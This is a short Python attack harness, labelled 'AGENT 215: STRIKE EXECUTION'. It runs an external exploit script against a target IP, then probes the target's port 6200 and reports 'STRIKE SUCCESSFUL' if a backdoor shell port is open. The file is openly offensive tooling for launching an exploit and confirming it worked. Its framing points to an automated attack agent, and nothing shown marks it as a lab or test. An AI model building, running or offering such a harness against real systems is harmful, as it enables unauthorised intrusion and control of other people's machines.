#!/home/dan/Chimera_Project/venv/bin/python3
import subprocess, sys, time, socket

def validate_strike(target_ip, exploit_path):
    print(f"--- [AGENT 215: STRIKE EXECUTION ON {target_ip}] ---")
    try:
        proc = subprocess.Popen(['python3', exploit_path, '-host', target_ip], 
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        if s.connect_ex((target_ip, 6200)) == 0:
            print("[!!!] STRIKE SUCCESSFUL: Backdoor port 6200 is OPEN.")
            s.close()
            return True
        print("[-] Strike Unconfirmed.")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 2: validate_strike(sys.argv[1], sys.argv[2])
